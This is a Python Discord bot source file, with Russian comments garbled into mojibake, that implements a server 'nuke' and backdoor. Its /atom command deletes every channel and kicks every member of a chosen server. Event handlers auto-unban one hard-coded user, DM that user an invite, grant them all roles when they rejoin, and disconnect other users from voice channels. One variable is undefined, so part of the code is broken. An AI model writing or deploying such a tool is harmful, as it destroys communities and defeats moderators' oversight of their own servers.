import discord
from discord.ext import commands
import asyncio

TOKEN = 'your_token_here'  # –í–∞—à —Ç–æ–∫–µ–Ω –±–æ—Ç–∞
AUTHORIZED_USER_ID = your_user_id_here  # –í–∞—à ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True

bot = commands.Bot(command_prefix='/', intents=intents)

@bot.event
async def on_ready():
    print(f'–í–æ—à–µ–ª –∫–∞–∫ {bot.user}')

async def send_dm(user, message):
    try:
        await user.send(message)
    except discord.Forbidden:
        print(f'–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –õ–° –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user.name}. –í–æ–∑–º–æ–∂–Ω–æ, —É –Ω–∏—Ö –æ—Ç–∫–ª—é—á–µ–Ω—ã –õ–°.')

async def create_invite(guild):
    # –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É –¥–ª—è –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏—è
    invites = await guild.invites()
    if invites:
        return invites[0].url
    else:
        # –ï—Å–ª–∏ –Ω–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–π, —Å–æ–∑–¥–∞—Ç—å –Ω–æ–≤–æ–µ
        invite = await guild.text_channels[0].create_invite(max_age=300)
        return invite.url

@bot.command()
async def atom(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        await ctx.send("–£ –≤–∞—Å –Ω–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return

    if isinstance(ctx.channel, discord.DMChannel):
        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã –≤ –õ–°
        await handle_dm_atom(ctx)
    else:
        # –ò–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
        await ctx.send("–ö–æ–º–∞–Ω–¥–∞ `/atom` –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —Ç–æ–ª—å–∫–æ –≤ –ª–∏—á–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏—è—Ö.")

async def handle_dm_atom(ctx):
    guilds = bot.guilds
    if len(guilds) == 0:
        await ctx.send("–ë–æ—Ç –Ω–µ —Å–æ—Å—Ç–æ–∏—Ç –Ω–∏ –≤ –æ–¥–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ.")
        return

    emoji_list = generate_emojis(len(guilds))
    embed = discord.Embed(title="–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä")

    for i, guild in enumerate(guilds):
        embed.add_field(name=f'{emoji_list[i]} {guild.name}', value=f'ID: {guild.id}', inline=False)

    message = await ctx.send(embed=embed)
    for emoji in emoji_list:
        await message.add_reaction(emoji)

    def check(reaction, user):
        return user == ctx.author and reaction.message.id == message.id and reaction.emoji in emoji_list

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("–í—Ä–µ–º—è –≤—ã–±–æ—Ä–∞ –∏—Å—Ç–µ–∫–ª–æ.")
        return

    index = emoji_list.index(reaction.emoji)
    selected_guild = guilds[index]

    confirm_msg = await ctx.send(f"–í—ã –≤—ã–±—Ä–∞–ª–∏ —Å–µ—Ä–≤–µ—Ä **{selected_guild.name}**. –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã:\n‚úîÔ∏è - –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é\n‚ùå - –û—Ç–º–µ–Ω–∞")
    await confirm_msg.add_reaction('‚úîÔ∏è')
    await confirm_msg.add_reaction('‚ùå')

    def confirm_check(reaction, user):
        return user == ctx.author and reaction.message.id == confirm_msg.id and reaction.emoji in ['‚úîÔ∏è', '‚ùå']

    try:
        reaction, _ = await bot.wait_for('reaction_add', timeout=60.0, check=confirm_check)
    except asyncio.TimeoutError:
        await ctx.send("–í—Ä–µ–º—è –Ω–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∏—Å—Ç–µ–∫–ª–æ.")
        return

    if reaction.emoji == '‚úîÔ∏è':
        # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –Ω–∞ –≤—ã–±—Ä–∞–Ω–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ
        await perform_atom(selected_guild)
        await ctx.send(f"–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ **{selected_guild.name}**.")
    else:
        await ctx.send("–ö–æ–º–∞–Ω–¥–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞.")

async def perform_atom(guild):
    # –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö –∏ –≥–æ–ª–æ—Å–æ–≤—ã—Ö –∫–∞–Ω–∞–ª–æ–≤
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'–£–¥–∞–ª–µ–Ω –∫–∞–Ω–∞–ª: {channel.name}')
        except Exception as e:
            print(f'–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –∫–∞–Ω–∞–ª {channel.name}: {e}')

    # –í—ã–≥–Ω–∞—Ç—å –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    for member in guild.members:
        try:
            await member.kick(reason="–í—ã–≥–æ–Ω–∫–∞ –ø–æ –∫–æ–º–∞–Ω–¥–µ /atom")
            print(f'–í—ã–≥–Ω–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {member.name}')
        except Exception as e:
            print(f'–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–≥–Ω–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {member.name}: {e}')

@bot.event
async def on_member_join(member):
    if member.id == AUTHORIZED_USER_ID:
        roles = [role for role in member.guild.roles if role.name != "@everyone"]
        # –û—Ç—Ñ–∏–ª—å—Ç—Ä–æ–≤–∞—Ç—å —Ä–æ–ª–∏, –∫–æ—Ç–æ—Ä—ã–µ –±–æ—Ç –º–æ–∂–µ—Ç –Ω–∞–∑–Ω–∞—á–∏—Ç—å
        roles = [role for role in roles if role.position < member.guild.me.top_role.position]
        await member.edit(roles=roles)
        await send_dm(member, f'–í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä! –í–∞–º –±—ã–ª–∏ –≤—ã–¥–∞–Ω—ã –≤—Å–µ —Ä–æ–ª–∏.')

@bot.event
async def on_member_ban(guild, user):
    if user.id == AUTHORIZED_USER_ID:
        invite_link = await create_invite(guild)
        await send_dm(user, f'–í—ã –±—ã–ª–∏ –∑–∞–±–∞–Ω–µ–Ω—ã. –í–æ—Ç —Å—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏—è: {invite_link}')
        await guild.unban(user)  # –ù–µ–º–µ–¥–ª–µ–Ω–Ω–æ —Ä–∞–∑–±–∞–Ω–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        await send_dm(user, f'–í—ã –±—ã–ª–∏ —Ä–∞–∑–±–∞–Ω–µ–Ω—ã –∏ –≤–µ—Ä–Ω—É–ª–∏—Å—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä!')

def generate_emojis(count):
    # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —ç–º–æ–¥–∑–∏ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Å–µ—Ä–≤–µ—Ä–æ–≤
    emojis = []
    for i in range(1, count + 1):
        if i <= 10:
            emojis.append(f'{i}Ô∏è‚É£')
        else:
            emojis.append(f'üîü{i-10}')  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –¥–ª—è —á–∏—Å–µ–ª –±–æ–ª—å—à–µ 10
    return emojis

@bot.event
async def on_voice_state_update(member, before, after):
    if before.channel != after.channel and after.channel is not None:
        if member.id == AUTHORIZED_USER_ID:
            target_channel = bot.get_channel(target_voice_channel_id)
            await member.move_to(target_channel)
            if before.channel is not None:
                for m in before.channel.members:
                    if m.id != AUTHORIZED_USER_ID:
                        await m.move_to(None)

bot.run(TOKEN)
